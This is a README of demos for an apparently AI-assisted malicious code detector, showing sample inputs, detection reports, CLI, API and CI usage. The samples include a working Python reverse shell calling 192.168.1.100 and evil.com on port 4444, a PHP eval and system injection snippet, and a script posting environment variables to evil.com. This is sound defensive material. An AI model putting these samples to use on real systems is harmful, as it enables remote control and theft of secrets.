# 🎬 Demo & Examples

## Live Demo

See the detector in action!

### Example 1: Detecting a Backdoor

**Input Code (Python):**
```python
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.100', 4444))

while True:
    cmd = s.recv(1024).decode()
    output = subprocess.check_output(cmd, shell=True)
    s.send(output)
```

**Detection Result:**
```
⚠️  RISK LEVEL: HIGH (65/100)

Detected Threats:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[MEDIUM] network_communication
  Line: 4
  Creates network socket - potential backdoor
  💡 Review network communication necessity

[HIGH] command_injection
  Line: 9
  subprocess with shell=True is vulnerable to injection
  💡 Use shell=False and pass command as list

🤖 AI Analysis:
This code implements a classic reverse shell backdoor. It 
establishes a network connection and executes arbitrary 
commands received from a remote attacker. This is highly 
suspicious and should be investigated immediately.
```

---

### Example 2: PHP Code Injection

**Input Code (PHP):**
```php
<?php
$user_input = $_GET['code'];
eval($user_input);

$file = $_POST['filename'];
system("cat " . $file);
?>
```

**Detection Result:**
```
⚠️  RISK LEVEL: CRITICAL (100/100)

Detected Threats:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[CRITICAL] code_injection
  Line: 3
  eval() executes arbitrary PHP code
  💡 Remove eval() completely

[CRITICAL] command_injection
  Line: 6
  Executes system commands
  💡 Avoid or use escapeshellcmd()

[MEDIUM] input_handling
  Line: 2
  Direct use of user input
  💡 Sanitize and validate all input

🤖 AI Analysis:
CRITICAL SECURITY VULNERABILITIES. This code contains 
two extremely dangerous patterns: eval() with untrusted 
input allows arbitrary code execution, and unsanitized 
command execution enables shell injection. This code 
should never reach production.
```

---

### Example 3: Data Exfiltration

**Input Code (Python):**
```python
import os
import requests

# Collect system info
data = {
    'env': dict(os.environ),
    'user': os.getlogin(),
    'cwd': os.getcwd()
}

# Send to external server
requests.post('https://evil.com/collect', json=data)
```

**Detection Result:**
```
⚠️  RISK LEVEL: MEDIUM (45/100)

Detected Threats:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[MEDIUM] data_exfiltration
  Line: 12
  HTTP request - potential data exfiltration
  💡 Review destination and data being sent

🤖 AI Analysis:
This script collects sensitive system information 
including environment variables and sends it to an 
external server. While the operations themselves aren't 
necessarily malicious, the combination suggests potential 
data exfiltration. Verify the destination URL is 
legitimate and that data transmission is authorized.
```

---

### Example 4: Safe Code (No Threats)

**Input Code (Python):**
```python
import json
import logging

def process_data(input_file, output_file):
    logging.basicConfig(level=logging.INFO)
    
    with open(input_file, 'r') as f:
        data = json.load(f)
    
    processed = [item.upper() for item in data]
    
    with open(output_file, 'w') as f:
        json.dump(processed, f, indent=2)
    
    logging.info(f"Processed {len(processed)} items")
```

**Detection Result:**
```
✅ RISK LEVEL: LOW (0/100)

No threats detected!

🤖 AI Analysis:
This is clean, well-structured code that safely processes 
JSON data. It uses proper file handling, includes logging, 
and doesn't perform any dangerous operations. No security 
concerns identified.
```

---

## CLI Usage Examples

### Analyze a Single File
```bash
$ python cli.py analyze --file suspicious.py

╔══════════════════════════════════════╗
║   🛡️  Malicious Code Detector CLI   ║
╚══════════════════════════════════════╝

📄 Analyzing: suspicious.py
🔤 Language: python

⏳ Running analysis...

============================================================
Risk Level: HIGH (Score: 75/100)
============================================================

⚠️  Detected Threats:

[CRITICAL] code_injection
  Line: 15
  Use of eval() with untrusted input
  💡 Avoid eval() or use ast.literal_eval() for safe parsing

[HIGH] command_injection
  Line: 23
  Unsafe use of os.system() - potential command injection
  💡 Use subprocess.run() with shell=False
```

### Scan a Directory
```bash
$ python cli.py scan --dir ./myproject

╔══════════════════════════════════════╗
║   🛡️  Malicious Code Detector CLI   ║
╚══════════════════════════════════════╝

📁 Scanning directory: ./myproject
🔍 Recursive: True
📝 Extensions: .py, .js, .php, .sh

Found 25 file(s) to analyze

📝 utils/helper.py - LOW (15/100)
⚠️ auth/login.py - HIGH (70/100)
⚠️ api/admin.py - CRITICAL (95/100)
📝 tests/test_auth.py - LOW (10/100)

============================================================
Scan Complete
============================================================
Files scanned: 25
Total threats: 12
High-risk files: 2

⚠️  HIGH RISK FILES:

📄 auth/login.py
   • sql_injection: Direct SQL query construction
   • input_handling: Unsanitized user input
   • weak_crypto: Use of deprecated MD5 hashing

📄 api/admin.py
   • code_injection: eval() with user input
   • privilege_escalation: Admin check can be bypassed
   • command_injection: Shell command with user input
```

### Watch Mode (Continuous Monitoring)
```bash
$ python cli.py watch --dir ./src --interval 5

╔══════════════════════════════════════╗
║   🛡️  Malicious Code Detector CLI   ║
╚══════════════════════════════════════╝

👁️  Watching: ./src
⏱️  Interval: 5s
Press Ctrl+C to stop

[2024-03-06 08:45:12] ✅ No changes detected
[2024-03-06 08:45:17] ✅ No changes detected
[2024-03-06 08:45:22] 📝 File modified: app.py
[2024-03-06 08:45:22] ⚠️  New threat detected: app.py

============================================================
Risk Level: HIGH (Score: 65/100)
============================================================

[HIGH] command_injection
  Line: 45
  subprocess with shell=True is vulnerable to injection
  💡 Use shell=False and pass command as list
```

---

## API Usage Examples

### Python SDK
```python
from detector import MaliciousCodeDetector
import yaml

# Load config
with open('config.yaml') as f:
    config = yaml.safe_load(f)

# Initialize detector
detector = MaliciousCodeDetector(config)

# Analyze code
code = """
import os
os.system(user_input)
"""

result = detector.analyze(code, language='python')

print(f"Risk: {result['risk_level']}")
print(f"Score: {result['score']}/100")
print(f"Threats: {len(result['threats'])}")

if result['risk_level'] in ['high', 'critical']:
    print("🚨 ALERT: High-risk code detected!")
    for threat in result['threats']:
        print(f"  - {threat['type']}: {threat['description']}")
```

### cURL API
```bash
# Analyze code via API
curl -X POST http://localhost:5000/api/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "code": "eval(request.form[\"code\"])",
    "language": "python"
  }' | jq .

# Response:
{
  "risk_level": "critical",
  "score": 85,
  "threats": [
    {
      "type": "code_injection",
      "severity": "critical",
      "line": 1,
      "description": "Use of eval() with untrusted input",
      "recommendation": "Avoid eval() or use ast.literal_eval()"
    }
  ],
  "ai_analysis": "This code is extremely dangerous..."
}
```

### JavaScript Fetch
```javascript
async function analyzeCode(code, language) {
  const response = await fetch('http://localhost:5000/api/analyze', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ code, language })
  });
  
  const result = await response.json();
  
  if (result.risk_level === 'high' || result.risk_level === 'critical') {
    alert('⚠️ Malicious code detected!');
    console.error('Threats:', result.threats);
  }
  
  return result;
}

// Usage
const code = 'os.system(user_input)';
const result = await analyzeCode(code, 'python');
console.log('Risk score:', result.score);
```

---

## Web Interface Screenshots

### 1. Analysis Interface
```
┌─────────────────────────────────────────────────────────┐
│  🛡️ Malicious Code Detector                             │
│  AI-powered security analysis for your code             │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │ import socket                                     │  │
│  │ import subprocess                                 │  │
│  │                                                   │  │
│  │ s = socket.socket()                              │  │
│  │ s.connect(('evil.com', 4444))                    │  │
│  │                                                   │  │
│  │ while True:                                       │  │
│  │     cmd = s.recv(1024)                           │  │
│  │     subprocess.run(cmd, shell=True)              │  │
│  └──────────────────────────────────────────────────┘  │
│                                                          │
│  Language: [Python ▼]     [🔍 Analyze Code]            │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 2. Results Display
```
┌─────────────────────────────────────────────────────────┐
│  ⚠️ RISK LEVEL: HIGH (75/100)                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ⚠️ Detected Threats                                    │
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │ COMMAND_INJECTION - CRITICAL                      │  │
│  │ Line: 9                                           │  │
│  │ subprocess with shell=True is vulnerable to       │  │
│  │ injection                                         │  │
│  │ 💡 Use shell=False and pass command as list      │  │
│  └──────────────────────────────────────────────────┘  │
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │ NETWORK_COMMUNICATION - MEDIUM                    │  │
│  │ Line: 4                                           │  │
│  │ Creates network socket - potential backdoor       │  │
│  │ 💡 Review network communication necessity        │  │
│  └──────────────────────────────────────────────────┘  │
│                                                          │
│  🤖 AI Analysis                                          │
│  This code implements a reverse shell backdoor...       │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## Performance Benchmarks

| File Size | Pattern Match | Static Analysis | AI Analysis | Total  |
|-----------|---------------|-----------------|-------------|--------|
| 100 lines | 15ms          | 150ms           | 2.1s        | 2.3s   |
| 500 lines | 45ms          | 380ms           | 3.5s        | 3.9s   |
| 1000 lines| 85ms          | 720ms           | 4.8s        | 5.6s   |

*Benchmarks on i5 CPU, 8GB RAM, with codellama:7b model*

---

## Real-World Use Cases

### 1. **Open Source Security Review**
```bash
# Clone a repository
git clone https://github.com/user/suspicious-repo.git

# Scan entire project
python cli.py scan --dir suspicious-repo --recursive

# Review high-risk files
```

### 2. **CI/CD Pipeline Integration**
```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Install detector
        run: pip install -r requirements.txt
      - name: Scan code
        run: python cli.py scan --dir . --threshold 70
```

### 3. **Pre-commit Hook**
```bash
#!/bin/bash
# .git/hooks/pre-commit
for file in $(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(py|js|php)$'); do
  python cli.py analyze --file "$file"
  if [ $? -ne 0 ]; then
    echo "Security issues found in $file"
    exit 1
  fi
done
```

---

**Try it yourself:** https://github.com/MissDaze/malicious-code-detector
